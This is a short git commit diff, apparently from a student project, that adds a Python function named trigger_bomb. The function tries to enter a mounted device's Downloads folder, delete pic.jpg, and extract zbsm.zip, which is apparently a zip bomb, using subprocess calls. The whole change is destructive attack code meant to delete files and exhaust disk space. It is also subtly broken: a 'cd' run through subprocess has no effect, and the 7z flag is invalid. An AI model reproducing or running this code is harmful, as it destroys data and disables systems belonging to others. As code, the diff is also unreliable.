3a6b03cf40082a5657248226cd3e34e44b5def7f
bclin8 <bclin@andrew.cmu.edu>
2022-04-17 21:54:09 -0700

    Added commands to trigger file bomb

--- trigger.py
+++ trigger.py
@@ -1,4 +1,11 @@
 import subprocess
 
 def trigger_bomb():
-    
+    cd_to_mounted_device = subprocess.run(["cd", "/mnt/shady_stuff/Downloads"], stdout=subprocess.DEVNULL)
+    remove_picture = subprocess.run(["rm", "pic.jpg"], stdout=subprocess.DEVNULL)
+    sync()
+    unload_file_bomb = subprocess.run(["7z", "-e", "zbsm.zip"], stdout=subprocess.DEVNULL)
+    sync()
+
+def sync():
+    sync = subprocess.run(["sync"])
